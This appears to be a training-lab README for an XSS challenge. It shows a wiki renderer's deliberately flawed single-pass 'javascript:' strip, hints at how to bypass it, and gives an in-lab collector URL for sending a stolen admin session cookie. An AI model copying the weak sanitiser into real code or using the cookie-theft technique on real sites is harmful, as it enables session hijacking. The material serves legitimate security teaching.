# Markdown Renderer — javascript: URI Filter Bypass

> Track: `xss` · Difficulty: **practitioner** · ~35 min · Free hints.

## Scenario

**WikiLite** is a tiny internal wiki. You draft a page in markdown and staff
review it before it goes live. The one piece of markdown it renders is the link:

```
[link text](url)   →   <a class="wiki-link" href="url">link text</a>
```

The author knows raw hrefs are dangerous, so the renderer "sanitises" every URL
before it goes into the `href` — it strips `javascript:` out of the string:

```python
url = re.sub(r"javascript:", "", url, flags=re.IGNORECASE)   # the whole defence
```

Post a page and staff review it here:

```
GET /admin/review        (staff session required — 403 otherwise)
```

The reviewer is a headless-Chromium bot that, every couple of seconds:

- loads `GET /admin/review` **carrying the admin `session` cookie**, and
- **clicks the primary link** on the page (`a.wiki-link`) — the way a human
  reviewer checks that a submitted link goes somewhere sensible.

That click is the delivery. If you can smuggle a `javascript:` URI past the strip
and into the `href`, it runs in the admin's browser the moment the bot clicks it.

## Objective

The admin's `session` cookie is **not** `HttpOnly`, so script running in the
admin's browser can read it. Steal it and beacon it to the in-lab collector:

```
http://collector:9000/report?c=<document.cookie>
```

The collector sits on an internal, **egress-dropped** network — the cookie can
reach it but never the real internet. Read what it captured through the app's
proxy:

```
GET /oob/received
```

then submit the recovered session value:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when the value matches the current admin
session.

## Getting Started

1. Post a page with an ordinary link and load nothing else — you cannot see
   `/admin/review` (403). What does your `[text](url)` become in the HTML the
   admin sees? The interesting attribute is the `href`.
2. A `javascript:` URI in an `href` runs script **when the link is clicked** — no
   `<script>`, no angle brackets. But the renderer strips the literal string
   `javascript:`. The strip runs **once**, and it matches an exact substring.
   What could sit _inside_ the scheme so the substring `javascript:` never
   appears in the stored string, yet a browser still reads it as `javascript:`
   when it follows the link?
3. Your code runs in the admin's session. The `session` cookie is readable
   (`document.cookie`). Read it, then send it somewhere you _can_ read.

**CWE-79 (Improper Neutralization of Input During Web Page Generation), the
attribute/href variant. OWASP A03:2021 – Injection.** The fix — a scheme
**allow-list** applied after
normalisation, and why stripping `javascript:` is the wrong tool — is in
`SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Node/Express wiki using **markdown-it** with a
custom `javascript:`-stripping link sanitiser, behind nginx, reviewed by a
Puppeteer bot. This lab **re-platforms it to Flask with a minimal in-app markdown
link renderer** — the lesson is the href-context sink plus the single-pass
substring strip, which is framework-independent. The markdown-it/Express/nginx
plumbing is incidental. See `SOLUTION.md` for the deviation note.
